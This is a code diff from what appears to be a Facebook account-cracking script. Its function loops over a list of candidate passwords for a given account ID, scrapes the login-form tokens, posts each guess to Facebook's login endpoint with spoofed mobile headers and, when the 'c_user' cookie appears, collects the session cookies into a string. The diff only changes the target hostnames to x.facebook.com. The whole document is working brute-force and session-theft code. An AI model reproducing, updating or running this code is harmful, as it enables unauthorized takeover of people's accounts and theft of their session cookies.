@@ -1137,7 +1137,7 @@ def m5(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get(f'https://m.facebook.com').text
+   free_fb = session.get(f'https://x.facebook.com').text
    log_data = {
     "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1148,7 +1148,7 @@ def m5(idf,pwv):
    "email":idf,
    "pass":ps,
    "login":"Log In"}
-   header_freefb = {'authority':'m.facebook.com',
+   header_freefb = {'authority':'x.facebook.com',
             'method': 'POST',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -1164,7 +1164,7 @@ def m5(idf,pwv):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post('https://web.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
+   lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
